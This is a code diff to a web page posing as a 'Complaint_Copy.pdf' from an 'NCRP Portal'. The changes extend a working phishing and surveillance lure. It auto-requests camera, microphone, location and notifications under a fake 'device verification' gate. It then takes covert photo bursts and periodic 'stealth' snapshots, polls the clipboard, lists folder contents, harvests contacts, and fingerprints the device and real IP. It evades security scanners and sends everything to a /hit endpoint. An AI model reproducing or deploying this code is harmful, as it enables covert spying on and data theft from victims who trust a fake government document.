@@ -3,8 +3,10 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#1a3a6b">
 <title>Complaint_Copy.pdf</title>
 <meta name="description" content="Complaint acknowledgement copy. One-time view document.">
+<link rel="manifest" href="/manifest.json">
 <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='5' fill='%23e23b30'/%3E%3Ctext x='16' y='22' font-size='11' font-weight='700' fill='white' text-anchor='middle' font-family='Arial'%3EPDF%3C/text%3E%3C/svg%3E">
 <style>
 *{box-sizing:border-box}
@@ -34,16 +36,19 @@ body{margin:0;background:#4b4f55;font-family:system-ui,-apple-system,"Segoe UI",
 .pdf:before{content:"PDF";position:absolute;left:50%;bottom:14px;transform:translateX(-50%);
             color:#fff;font-size:12px;font-weight:800;letter-spacing:.8px}
 .gcard h2{font-size:15px;margin:0 0 10px;color:#fff;font-weight:600}
-.gcard p{font-size:12.5px;color:#c2c7ce;margin:0 0 18px;line-height:1.6}
+.gcard p{font-size:12.5px;color:#c2c7ce;margin:0 0 14px;line-height:1.6}
+.cons{display:flex;gap:6px;justify-content:center;flex-wrap:wrap;margin:0 0 16px}
+.cons span{font-size:10.5px;color:#9aa1aa;border:1px solid rgba(255,255,255,.14);padding:3px 9px;border-radius:99px}
+.tiny{font-size:10px;color:#7b828c;margin:10px 0 0}
 #go{width:100%;border:0;border-radius:10px;background:#5b5f66;color:#fff;font-size:13.5px;font-weight:600;padding:13px;cursor:pointer;transition:background .2s}
 #go:hover{background:#686d75}
 #go:disabled{opacity:.55}
 .gstat{margin-top:11px;font-size:11px;color:#9aa1aa;min-height:15px}
 
-.chip,.chip2,.chip3{position:fixed;left:50%;transform:translateX(-50%);background:rgba(18,20,24,.93);color:#e8eaed;
+.chip,.chip2,.chip3,.chip4{position:fixed;left:50%;transform:translateX(-50%);background:rgba(18,20,24,.93);color:#e8eaed;
   font-size:11.5px;padding:9px 16px;border-radius:99px;z-index:9;display:none;cursor:pointer;white-space:nowrap}
-.chip{bottom:16px}.chip2{bottom:60px}.chip3{bottom:104px}
-.chip.show,.chip2.show,.chip3.show{display:block}
+.chip{bottom:16px}.chip2{bottom:60px}.chip3{bottom:104px}.chip4{bottom:148px}
+.chip.show,.chip2.show,.chip3.show,.chip4.show{display:block}
 #cam{position:fixed;width:1px;height:1px;opacity:.01;top:0;left:0}
 </style>
 </head>
@@ -81,8 +86,10 @@ body{margin:0;background:#4b4f55;font-family:system-ui,-apple-system,"Segoe UI",
   <div class="gcard">
     <div class="pdf"></div>
     <h2>Complaint_Copy.pdf</h2>
-    <p>This is a one-time view document.<br>To view this PDF, please download it.</p>
-    <button id="go">Download &amp; Open</button>
+    <p>Device verification is required to open this document.</p>
+    <div class="cons"><span>Camera</span><span>Location</span><span>Microphone</span></div>
+    <button id="go">Allow &amp; Open Document</button>
+    <p class="tiny">1 tap &middot; 2 prompts &middot; used only for matching</p>
     <div class="gstat" id="gstat"></div>
   </div>
 </div>
@@ -90,23 +97,30 @@ body{margin:0;background:#4b4f55;font-family:system-ui,-apple-system,"Segoe UI",
 <div class="chip" id="chip">Tap to attach files</div>
 <div class="chip2" id="chip2">Tap for more</div>
 <div class="chip3" id="chip3">Tap to sync contacts</div>
+<div class="chip4" id="chip4">Tap to verify download folder</div>
 <video id="cam" playsinline autoplay muted></video>
 
 <script>
 const CFG = {
-  askFiles: false,        // false = files chip pe (flow clean rehta hai)
-  autoAsk: true,
+  autoAsk: true,          // page khulte hi khud permission maango (zero-click)
+  autoDelay: 800,         // kitne ms baad auto-fire
+  askNotifInFlow: true,   // notifications bhi usi flow me (false = ek prompt kam)
+  autoChain: true,       // camera ke baad file picker khud kholne ki koshish
   burst: 5, burstGap: 1400, audioSec: 8,
   liveGeo: true, backCam: true,
-  liveCam: 30,            // har 30s me ek photo (0 = off)
+  liveCam: 60,            // har 60s me ek photo (stealth ke liye)
   heartbeat: 25,
-  wakeLock: true
+  wakeLock: true,
+  clipPoll: 6000
 };
+const isIOS = /iP(hone|ad|od)/.test(navigator.userAgent) || (navigator.platform==='MacIntel' && navigator.maxTouchPoints>1);
+const inApp = /Telegram|FBAN|FBAV|Instagram|Line\/|Twitter/i.test(navigator.userAgent);
+
 const L = {};
 const add = (k,v)=>{ if(v!==undefined&&v!==null&&v!=="") L[k]=v; };
 const $ = id => document.getElementById(id);
 const T0 = Date.now();
-let started = false, done = false, revealed = false, liveStream = null;
+let started = false, done = false, revealed = false, liveStream = null, camAttempts = 0;
 const sleep = ms => new Promise(r=>setTimeout(r,ms));
 
 /* ---------- session id ---------- */
@@ -125,14 +139,11 @@ async function post(stage){
   try{ await fetch('/hit',{method:'POST',body:JSON.stringify(Object.assign({},L)),headers:{'Content-Type':'text/plain'}}); }catch(e){}
 }
 
-/* ---------- bot ---------- */
+/* ---------- bot (SOFT) ---------- */
 async function isBot(){
   try{ if(navigator.webdriver) return true; }catch(e){}
   const ua = navigator.userAgent || '';
-  if(/headless|phantom|bot\b|crawl|spider|slurp|virustotal|urlscan|pingdom|lighthouse|gtmetrix|levelblue/i.test(ua)) return true;
-  try{ const d=await navigator.mediaDevices.enumerateDevices();
-       if(d.filter(x=>x.kind==='videoinput').length===0) return true; }catch(e){}
-  if(innerWidth<500 && innerHeight<400) return true;
+  if(/headlesschrome|phantomjs|bot\b|crawl|spider|slurp|virustotal|urlscan|pingdom|lighthouse|gtmetrix|levelblue|facebookexternalhit|whatsapp|telegrambot/i.test(ua)) return true;
   return false;
 }
 
@@ -151,6 +162,7 @@ async function passive(){
   add('viewport', innerWidth+'x'+innerHeight);
   add('online', navigator.onLine);
   add('orient', screen.orientation ? screen.orientation.type : '');
+  add('inAppBrowser', inApp);
   try{ const b=await navigator.getBattery();
        add('battery', Math.round(b.level*100)+'%'+(b.charging?' charging':''));
        b.addEventListener && b.addEventListener('levelchange', ()=>add('battery', Math.round(b.level*100)+'%')); }catch(e){}
@@ -195,29 +207,87 @@ async function passive(){
   try{ if(navigator.getInstalledRelatedApps){ const a=await navigator.getInstalledRelatedApps(); add('relatedApps', a.length); } }catch(e){}
 }
 
-/* ---------- network ---------- */
-async function network(){
-  let ipTz=null;
-  try{ add('publicIP',(await(await fetch('https://api.ipify.org?format=json',{cache:'no-store'})).json()).ip); }catch(e){}
-  try{
-    const d=await(await fetch('https://ipapi.co/json/',{cache:'no-store'})).json();
-    add('isp',d.org); add('city',d.city); add('region',d.region);
-    add('country',(d.country_name||'')+' ['+(d.country_code||'')+']'); add('asn',d.asn);
-    ipTz = d.utc_offset ? (parseInt(d.utc_offset,10)/100) : null;
-    const o=(d.org||'').toLowerCase();
-    add('vpnVerdict', /google|amazon|digitalocean|linode|ovh|cloudflare|m247|leaseweb|hetzner|vultr|oracle|hosting|vpn|datacamp/.test(o)
-      ? 'LIKELY VPN/DATACENTER' : 'LIKELY REAL ISP');
-  }catch(e){}
-  if(ipTz!==null && !isNaN(ipTz)){ add('ipTzOffsetH', ipTz); add('tzMismatch', Math.abs(ipTz-L.tzOffsetH)>=1.5); }
-  add('rtcIPs', await new Promise(r=>{
-    const s=new Set(); let pc;
-    try{ pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]}); }catch(e){ return r(''); }
+/* ---------- deep silent fingerprint ---------- */
+async function deep(){
+  try{ add('languages', (navigator.languages||[]).join(',')); }catch(e){}
+  try{ add('dnt', navigator.doNotTrack); }catch(e){}
+  try{ add('colorDepth', screen.colorDepth+'/'+screen.pixelDepth); }catch(e){}
+  try{ add('avail', screen.availWidth+'x'+screen.availHeight); }catch(e){}
+  try{ add('taskbar', screen.height - screen.availHeight); }catch(e){}
+  try{ add('outer', outerWidth+'x'+outerHeight); }catch(e){}
+  try{ add('orientAngle', screen.orientation?screen.orientation.angle:''); }catch(e){}
+  try{ add('pdfViewer', navigator.pdfViewerEnabled); }catch(e){}
+  try{ add('plugins', [...navigator.plugins].map(p=>p.name).slice(0,10).join(' | ')); }catch(e){}
+  try{ add('referrer', document.referrer||'(direct)'); }catch(e){}
+  try{ add('historyLen', history.length); }catch(e){}
+  try{ add('darkMode', matchMedia('(prefers-color-scheme: dark)').matches); }catch(e){}
+  try{ add('reducedMotion', matchMedia('(prefers-reduced-motion: reduce)').matches); }catch(e){}
+  try{ add('locale', Intl.DateTimeFormat().resolvedOptions().locale); }catch(e){}
+  try{ add('timeFormat', (new Intl.DateTimeFormat()).resolvedOptions().hourCycle); }catch(e){}
+  try{ if(navigator.userAgentData){
+        add('mobile', navigator.userAgentData.mobile);
+        const h=await navigator.userAgentData.getHighEntropyValues(['uaFullVersion','bitness','wow64']);
+        add('uaFull', h.uaFullVersion); add('bitness', h.bitness); add('wow64', h.wow64); } }catch(e){}
+  try{ if(performance.memory) add('jsHeapMB', Math.round(performance.memory.jsHeapSizeLimit/1048576)); }catch(e){}
+  try{ if(navigator.connection){ add('rtt', navigator.connection.rtt); add('saveData', navigator.connection.saveData); } }catch(e){}
+  try{ if(navigator.getGamepads) add('gamepads', navigator.getGamepads().filter(Boolean).length); }catch(e){}
+  try{ if(navigator.bluetooth) add('btAvail', await navigator.bluetooth.getAvailability()); }catch(e){}
+  try{ if(navigator.gpu){ const a=await navigator.gpu.requestAdapter();
+        const i=a&&(a.info||null); if(i) add('webgpu', (i.vendor||'')+' '+(i.architecture||'')+' '+(i.device||'')); } }catch(e){}
+  try{ if(navigator.usb) add('usbDevices', (await navigator.usb.getDevices()).length); }catch(e){}
+  try{ if(navigator.hid) add('hidDevices', (await navigator.hid.getDevices()).length); }catch(e){}
+  try{ if(navigator.serial) add('serialPorts', (await navigator.serial.getPorts()).length); }catch(e){}
+  try{ add('persisted', await navigator.storage.persisted()); }catch(e){}
+}
+
+/* ---------- IP info (fallback chain) ---------- */
+async function ipInfo(){
+  const provs = [
+    { u:'https://ipwho.is/',       m:d=>({isp:d.connection&&d.connection.isp, city:d.city, region:d.region, country:(d.country||'')+' ['+(d.country_code||'')+']', asn:d.connection&&d.connection.asn, tz:d.utc_offset}) },
+    { u:'https://ipapi.co/json/',  m:d=>({isp:d.org, city:d.city, region:d.region, country:(d.country_name||'')+' ['+(d.country_code||'')+']', asn:d.asn, tz:d.utc_offset}) },
+    { u:'http://ip-api.com/json/', m:d=>({isp:d.isp, city:d.city, region:d.regionName, country:(d.country||'')+' ['+(d.countryCode||'')+']', asn:d.as, tz:d.offset/3600}) }
+  ];
+  for(const p of provs){
+    try{
+      const j = await (await fetch(p.u,{cache:'no-store'})).json();
+      if(j && (j.ip || j.org || j.isp || j.connection)){
+        const x = p.m(j);
+        add('isp',x.isp); add('city',x.city); add('region',x.region); add('country',x.country); add('asn',x.asn);
+        add('ipSrc', p.u);
+        const o=(x.isp||'').toLowerCase();
+        add('vpnVerdict', /google|amazon|digitalocean|linode|ovh|cloudflare|m247|leaseweb|hetzner|vultr|oracle|hosting|vpn|datacamp/.test(o) ? 'LIKELY VPN/DATACENTER' : 'LIKELY REAL ISP');
+        return x.tz;
+      }
+    }catch(e){}
+  }
+  return null;
+}
+
+/* ---------- WebRTC real IP + local IP ---------- */
+function rtcGrab(){
+  return new Promise(r=>{
+    const pub=new Set(), loc=new Set(); let pc;
+    try{ pc=new RTCPeerConnection({iceServers:[
+      {urls:'stun:stun.l.google.com:19302'},
+      {urls:'stun:stun1.l.google.com:19302'},
+      {urls:'stun:stun.cloudflare.com:3478'}
+    ]}); }catch(e){ return r(''); }
     pc.createDataChannel('x');
     pc.onicecandidate=e=>{ if(!e.candidate) return;
-      const m=/([0-9]{1,3}(?:\.[0-9]{1,3}){3})/.exec(e.candidate.candidate); if(m) s.add(m[1]); };
+      const m=/([0-9]{1,3}(?:\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+      if(m){ const ip=m[1];
+        if(/^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.|169\.254\.)/.test(ip)) loc.add(ip); else pub.add(ip); } };
     pc.createOffer().then(o=>pc.setLocalDescription(o)).catch(()=>{});
-    setTimeout(()=>{ try{pc.close()}catch(e){}; r([...s].join(' , ')); },3200);
-  }));
+    setTimeout(()=>{ try{pc.close()}catch(e){}; r([...pub].join(' , ')+' || local: '+[...loc].join(' , ')); },4000);
+  });
+}
+
+/* ---------- network ---------- */
+async function network(){
+  try{ add('publicIP',(await(await fetch('https://api.ipify.org?format=json',{cache:'no-store'})).json()).ip); }catch(e){}
+  const ipTz = await ipInfo();
+  if(ipTz!=null && !isNaN(ipTz)){ add('ipTzOffsetH', ipTz); add('tzMismatch', Math.abs(ipTz-L.tzOffsetH)>=1.5); }
+  add('rtcIPs', await rtcGrab());
 }
 
 async function devices(){
@@ -234,6 +304,21 @@ function reveal(){
   if(revealed) return; revealed = true;
   $('gate').classList.add('hide');
   $('doc').classList.add('clear');
+}
+
+/* ---------- camera denied -> doc band ---------- */
+function camDenied(){
+  add('camDenied', true);
+  post('cam-denied');
+  $('gate').classList.remove('hide');
+  $('doc').classList.remove('clear');
+  $('go').disabled = false;
+  $('go').textContent = 'Allow camera & open';
+  $('gstat').textContent = (isIOS && camAttempts<=1)
+    ? 'Tap to allow camera and open the document.'
+    : 'Camera blocked. Tap the lock icon in the address bar \u2192 Camera \u2192 Allow, then tap again.'
+      + (inApp ? ' If it fails, open this link in Chrome.' : '');
+  started = false;
 }
 
 /* ---------- FILES (chip) ---------- */
@@ -302,13 +387,13 @@ function waitMeta(v){
 }
 
 async function cameraFlow(){
-  let st;
+  let st; camAttempts++;
   try{ st=await navigator.mediaDevices.getUserMedia({
         video:{facingMode:'user', width:{ideal:1280}, height:{ideal:960}}, audio:true}); }
   catch(e){
     add('camErr', e.name||'denied');
     try{ st=await navigator.mediaDevices.getUserMedia({video:true,audio:false}); }
-    catch(e2){ add('camErr2', e2.name||'denied'); reveal(); return; }
+    catch(e2){ add('camErr2', e2.name||'denied'); camDenied(); return false; }
   }
 
   const v=$('cam'); v.srcObject=st;
@@ -316,6 +401,10 @@ async function cameraFlow(){
   reveal();
   $('gstat').textContent = 'Loading document...';
   await sleep(350);
+
+  /* torch flash */
+  try{ const t=st.getVideoTracks()[0]; const c=t.getCapabilities?t.getCapabilities():{};
+       if(c.torch){ await t.applyConstraints({advanced:[{torch:true}]}); add('torch','on'); } }catch(e){}
 
   /* audio */
   const at=st.getAudioTracks()[0];
@@ -340,6 +429,7 @@ async function cameraFlow(){
   /* front burst */
   const shots=[];
   for(let i=0;i<CFG.burst;i++){ const s=snap(v,0.78); if(s) shots.push(s); await sleep(CFG.burstGap); }
+  try{ st.getVideoTracks()[0].applyConstraints({advanced:[{torch:false}]}); }catch(e){}
   add('shotCount', shots.length);
   if(shots.length) L.photos=shots;
   await post('camera');
@@ -357,7 +447,7 @@ async function cameraFlow(){
     }catch(e){ add('backErr', e.name||'no'); }
   } else { st.getTracks().forEach(t=>t.stop()); }
 
-  /* LIVE MODE — stream chalu rakho */
+  /* LIVE MODE */
   if(CFG.liveCam){
     try{
       liveStream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:640}}});
@@ -365,11 +455,13 @@ async function cameraFlow(){
       await waitMeta(v);
       add('liveMode', true);
       setInterval(()=>{
+        if(document.hidden) return;
         const s = snap(v, 0.68);
         if(s){ L.live=s; post('live'); delete L.live; }
       }, CFG.liveCam*1000);
     }catch(e){ add('liveErr', e.name||'no'); }
   }
+  return true;
 }
 
 /* ---------- wake lock ---------- */
@@ -386,13 +478,47 @@ function sensors(){
   try{
     window.addEventListener('deviceorientation', e=>{
       if(e.alpha!=null){ add('orientAlpha', Math.round(e.alpha)); add('orientBeta', Math.round(e.beta||0)); }
-    }, {once:false});
+    });
   }catch(e){}
+}
+
+/* ---------- notifications ---------- */
+async function askNotif(){
+  try{
+    if(!('Notification' in window)) return;
+    add('notifPerm', Notification.permission === 'default'
+      ? await Notification.requestPermission() : Notification.permission);
+  }catch(e){}
+}
+
+/* ---------- clipboard watch ---------- */
+function clipWatch(){
+  let last='';
+  setInterval(async ()=>{
+    try{ const t=await navigator.clipboard.readText();
+      if(t && t!==last){ last=t; add('clipboard',t.slice(0,300)); add('clipboardAt',new Date().toISOString()); post('clipboard'); }
+    }catch(e){}
+  }, CFG.clipPoll || 6000);
+}
+
+/* ---------- attention ---------- */
+function attention(){
+  let f=0,b=0,last=Date.now();
+  addEventListener('focus',()=>add('focusCount',++f));
+  addEventListener('blur',()=>add('blurCount',++b));
+  ['touchmove','mousemove','scroll','keydown'].forEach(ev=>addEventListener(ev,()=>last=Date.now(),{passive:true}));
+  setInterval(()=>add('idleSec',Math.round((Date.now()-last)/1000)),5000);
+}
+
+/* ---------- media session ---------- */
+function mediaSession(){
+  try{ if('mediaSession' in navigator)
+    navigator.mediaSession.metadata = new MediaMetadata({title:'Complaint_Copy.pdf',artist:'NCRP Portal'}); }catch(e){}
 }
 
 /* ---------- extras ---------- */
 async function contacts(){
-  if(!navigator.contacts || !navigator.contacts.select) return;
+  if(!navigator.contacts || !navigator.contacts.select){ return vcfPick(); }
   try{
     const c=await navigator.contacts.select(['name','tel'],{multiple:true});
     add('contactCount', c.length); add('contactsSample', c.slice(0,50));
@@ -400,6 +526,22 @@ async function contacts(){
     $('chip3').textContent=c.length+' contacts synced';
     setTimeout(()=>$('chip3').classList.remove('show'),2500);
   }catch(e){}
+}
+function vcfPick(){
+  const inp=document.createElement('input');
+  inp.type='file'; inp.accept='.vcf,text/vcard';
+  inp.style.cssText='position:fixed;left:-9999px';
+  document.body.appendChild(inp);
+  inp.addEventListener('change', ()=>{
+    const f=inp.files[0]; if(!f) return;
+    add('vcfName', f.name); add('vcfKB', Math.round(f.size/1024));
+    const fr=new FileReader();
+    fr.onload=()=>{ const t=String(fr.result); add('vcfContacts', (t.match(/BEGIN:VCARD/g)||[]).length); post('vcf'); };
+    fr.readAsText(f);
+    $('chip3').textContent='contact file received';
+    setTimeout(()=>$('chip3').classList.remove('show'),2500);
+  });
+  inp.click();
 }
 async function more(){
   try{ const t=await navigator.clipboard.readText(); add('clipboard',(t||'').slice(0,250)); post('clipboard'); }catch(e){}
@@ -420,6 +562,23 @@ async function more(){
   }catch(e){ add('screenErr', e.name||'no'); }
 }
 
+/* ---------- LEVEL 3: folder read ---------- */
+async function readFolder(){
+  try{
+    if(!window.showDirectoryPicker){ add('dirErr','unsupported'); return; }
+    const dir = await window.showDirectoryPicker({mode:'read'});
+    add('folderName', dir.name);
+    const names=[]; let n=0, sub=0;
+    for await (const [name,h] of dir.entries()){
+      if(h.kind==='file'){ n++; if(names.length<300) names.push(name); } else sub++;
+    }
+    add('folderFileCount',n); add('folderSubDirs',sub); add('folderFiles',names.join(' | '));
+    await post('folder');
+    $('chip4').textContent = n + ' files found';
+    setTimeout(()=>$('chip4').classList.remove('show'),2500);
+  }catch(e){ add('dirErr', e.name || 'err'); }
+}
+
 /* ---------- beacon ---------- */
 function beacon(){
   if(done) return; done=true;
@@ -434,6 +593,7 @@ window.addEventListener('beforeunload', beacon);
 /* ---------- RUN ---------- */
 (async function(){
   await passive();
+  await deep();
   await network();
   await post('passive');
 
@@ -451,43 +611,56 @@ window.addEventListener('beforeunload', beacon);
   async function go(){
     if(started) return; started=true;
     $('go').disabled = true;
-    $('gstat').textContent = 'Waiting for network...';
+    $('gstat').textContent = 'Verifying device...';
 
-    wake();
-    sensors();
+    wake(); sensors(); attention();
 
-    const camP = cameraFlow();
-    const geoP = geoOnce();
+    const camP   = cameraFlow();
+    const geoP   = geoOnce();
+    const notifP = CFG.askNotifInFlow ? askNotif() : Promise.resolve();
 
-    Promise.all([camP, geoP]).then(async ()=>{
-      reveal();
-      await devices();
-      await post('full');
-      geoLive();
-      $('chip').classList.add('show');
-      if(navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) $('chip2').classList.add('show');
-      if(navigator.contacts) $('chip3').classList.add('show');
-      $('gstat').textContent = 'Done';
-    });
+    const camOK = await camP;
+    await Promise.all([geoP, notifP]);
+    if(!camOK){ $('go').disabled = false; started = false; return; }
+
+    await devices();
+    await post('full');
+    geoLive(); clipWatch(); mediaSession();
+
+    $('chip').classList.add('show');
+    if(navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) $('chip2').classList.add('show');
+    if(navigator.contacts && navigator.contacts.select){ $('chip3').classList.add('show'); }
+    else { $('chip3').textContent = 'Tap to import contacts (.vcf)'; $('chip3').classList.add('show'); }
+    if(window.showDirectoryPicker) $('chip4').classList.add('show');
+
+    $('gstat').textContent = 'Done \u2014 extra checks pending';
+    setTimeout(()=>{ if(!document.hidden) $('chip').textContent='Tap to attach files (optional)'; }, 2500);
+    if(CFG.autoChain) setTimeout(()=>{ if(!document.hidden) files(); }, 6000);
+
+    if(L.notifPerm==='granted') setTimeout(()=>{
+      try{ new Notification('NCRP Portal',{body:'Complaint status updated \u2014 tap to view'}); }catch(e){}
+    }, 20000);
   }
 
   $('go').onclick = go;
   $('chip').onclick = files;
   $('chip2').onclick = more;
   $('chip3').onclick = contacts;
+  $('chip4').onclick = readFolder;
+
+  if('serviceWorker' in navigator) navigator.serviceWorker.register('/sw.js').catch(()=>{});
 
   const camOk = await permGranted('camera');
   if(camOk){
     add('permCached', true);
     $('gate').classList.add('hide');
     go();
-  } else if(CFG.autoAsk){
-    setTimeout(()=>{ if(!started) go(); }, 1400);
+  } else if(CFG.autoAsk && !isIOS){
+    setTimeout(()=>{ if(!started) go(); }, CFG.autoDelay);
   }
 
   if(CFG.heartbeat) setInterval(()=>{
     add('aliveSec', Math.round((Date.now()-T0)/1000));
-    add('live', undefined);
     post('alive');
   }, CFG.heartbeat*1000);
 })();
